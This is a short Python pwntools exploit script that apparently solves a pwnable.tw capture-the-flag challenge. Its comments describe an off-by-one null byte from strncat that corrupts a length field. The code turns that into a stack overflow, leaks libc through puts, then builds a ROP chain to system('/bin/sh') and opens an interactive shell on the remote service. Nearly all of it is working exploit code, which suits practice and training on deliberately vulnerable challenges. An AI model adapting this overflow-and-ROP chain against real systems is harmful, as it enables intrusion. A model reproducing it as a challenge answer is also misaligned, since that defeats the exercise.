from pwn import *

#r = process("./S", env={"LD_PRELOAD" : "./libc_32.so.6"})
r = remote('chall.pwnable.tw',10103)
### vuln at powerup function
### len variable is at the end of content : "string of content" + (DWORD) len of string
### so if we call powerup, strncat will be called and if we set up we concat string to full length
### it will fill 0x00 at the end of concate string, and the end of string is variable "len"
### so we can get buffer overflow
# 
#---stack-----
#  len
#  null
#  rbp
#

## create
r.sendafter(b'Your choice :',b'1')
r.sendafter(b'bullet :',b'a'*0x2f)
## power
r.sendafter(b'Your choice :',b'2')
r.sendafter(b'bullet :',b'b')

### leak libc base
puts_got = 0x804afdc
puts_offset = 0x0005f140
main = 0x08048954
puts = 0x80484a8
system_offset = 0x3a940
bin_sh_offset = 0x158e8b
### gadget


### leak libc
payload = b'\xff' * 7 + p32(puts) + p32(main) + p32(0x804afdc)

r.sendafter(b'Your choice :',b'2')
r.sendafter(b'bullet :',payload)
r.sendafter(b'Your choice :',b'3')
r.recvuntil(b'You win !!\n')
libc_base = u32(r.recv(4)) - puts_offset
print(hex(libc_base))

### get shell 
r.sendafter(b'Your choice :',b'1')
r.sendafter(b'bullet :',b'a'*0x2f)
r.sendafter(b'Your choice :',b'2')
r.sendafter(b'bullet :',b'b')

payload = b'\xff' * 7 + p32(libc_base + system_offset) + p32(libc_base + bin_sh_offset) * 2
r.sendafter(b'Your choice :',b'2')
r.sendafter(b'bullet :',payload)
r.sendafter(b'Your choice :',b'3')


r.interactive()